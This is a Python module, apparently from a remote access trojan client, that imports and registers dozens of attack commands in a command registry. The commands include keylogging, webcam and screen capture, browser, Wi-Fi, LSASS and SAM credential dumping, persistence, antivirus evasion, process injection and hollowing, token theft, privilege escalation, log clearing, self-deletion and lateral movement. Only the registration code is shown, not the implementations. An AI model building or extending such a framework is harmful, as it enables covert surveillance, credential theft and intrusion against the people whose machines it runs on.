from client.core.command_registry import CommandRegistry
from client.commands.file_commands import LsCommand, CdCommand, PwdCommand, RmCommand, MvCommand, CatCommand, TouchCommand
from client.commands.transfer_commands import UploadCommand, DownloadCommand, ChunkedDownloadCommand
from client.commands.shell_commands import PsCommand, IfconfigCommand, KillCommand, PkillCommand, GrepCommand
from client.commands.system_commands import SysinfoCommand, CheckAdminCommand, ClipboardCommand
from client.commands.surveillance_commands import ScreenshotCommand, WebcamCommand
from client.commands.keylogger_commands import KeylogStartCommand, KeylogDumpCommand, KeylogStopCommand
from client.commands.credential_commands import WifiDumpCommand, BrowserCredsCommand
from client.commands.persistence_commands import PersistenceCommand
from client.commands.session_commands import QuitCommand, BackgroundCommand, HelpCommand, ClearCommand, TerminateCommand, SendallCommand
from client.commands.stealth_commands import (
    EvasionCommand, DetectVMCommand, InjectCommand, StealTokenCommand,
    RevertTokenCommand, WhoamiCommand, EnablePrivilegeCommand,
    ClearLogsCommand, TimestompCommand, SelfDeleteCommand,
    HollowCommand, MigrateCommand, LsassDumpCommand, Socks5Command,
    ScanCommand, PsexecCommand, SSHSprdCommand,
    UnhookCommand, SyscallInjectCommand, EarlyBirdCommand,
    PtieshCommand, StreamStartCommand, StreamStopCommand,
    SamDumpCommand, BrowserDumpV2Command,
)
from client.commands.privesc_commands import PrivescLinuxCommand, PrivescWindowsCommand
from client.commands.rat_commands import KeystrokeCommand, MouseCommand, ClickCommand, LockScreenCommand


def build_client_registry() -> CommandRegistry:
    registry = CommandRegistry()
    registry.register(LsCommand())
    registry.register(CdCommand())
    registry.register(PwdCommand())
    registry.register(RmCommand())
    registry.register(MvCommand())
    registry.register(CatCommand())
    registry.register(TouchCommand())
    registry.register(UploadCommand())
    registry.register(DownloadCommand())
    registry.register(ChunkedDownloadCommand())
    registry.register(PsCommand())
    registry.register(IfconfigCommand())
    registry.register(KillCommand())
    registry.register(PkillCommand())
    registry.register(GrepCommand())
    registry.register(SysinfoCommand())
    registry.register(CheckAdminCommand())
    registry.register(ClipboardCommand())
    registry.register(ScreenshotCommand())
    registry.register(WebcamCommand())
    registry.register(KeylogStartCommand())
    registry.register(KeylogDumpCommand())
    registry.register(KeylogStopCommand())
    registry.register(WifiDumpCommand())
    registry.register(BrowserCredsCommand())
    registry.register(PersistenceCommand())
    registry.register(QuitCommand())
    registry.register(BackgroundCommand())
    registry.register(HelpCommand())
    registry.register(ClearCommand())
    registry.register(TerminateCommand())
    registry.register(SendallCommand())
    registry.register(EvasionCommand())
    registry.register(DetectVMCommand())
    registry.register(InjectCommand())
    registry.register(StealTokenCommand())
    registry.register(RevertTokenCommand())
    registry.register(WhoamiCommand())
    registry.register(EnablePrivilegeCommand())
    registry.register(ClearLogsCommand())
    registry.register(TimestompCommand())
    registry.register(SelfDeleteCommand())
    registry.register(HollowCommand())
    registry.register(MigrateCommand())
    registry.register(LsassDumpCommand())
    registry.register(Socks5Command())
    registry.register(ScanCommand())
    registry.register(PsexecCommand())
    registry.register(SSHSprdCommand())
    registry.register(UnhookCommand())
    registry.register(SyscallInjectCommand())
    registry.register(EarlyBirdCommand())
    registry.register(PtieshCommand())
    registry.register(StreamStartCommand())
    registry.register(StreamStopCommand())
    registry.register(SamDumpCommand())
    registry.register(BrowserDumpV2Command())
    registry.register(PrivescLinuxCommand())
    registry.register(PrivescWindowsCommand())
    registry.register(KeystrokeCommand())
    registry.register(MouseCommand())
    registry.register(ClickCommand())
    registry.register(LockScreenCommand())
    return registry
